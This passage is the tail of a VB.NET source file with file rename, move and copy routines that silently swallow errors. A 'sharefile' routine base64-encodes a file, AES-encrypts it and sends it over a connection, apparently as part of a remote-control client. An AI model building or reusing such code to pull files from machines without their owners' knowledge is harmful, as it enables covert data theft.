                My.Computer.FileSystem.RenameFile(path, newname)
            Catch
            End Try
        End Sub
        Sub movefile(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.MoveFile(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub copyfile(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.CopyFile(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub sharefile(ByVal filepath As String)
            Dim file As String = Convert.ToBase64String(IO.File.ReadAllBytes(filepath))
            Send(AES_Encrypt("IncomingFile" & file, enckey))
        End Sub
#End Region
    End Class

End Namespace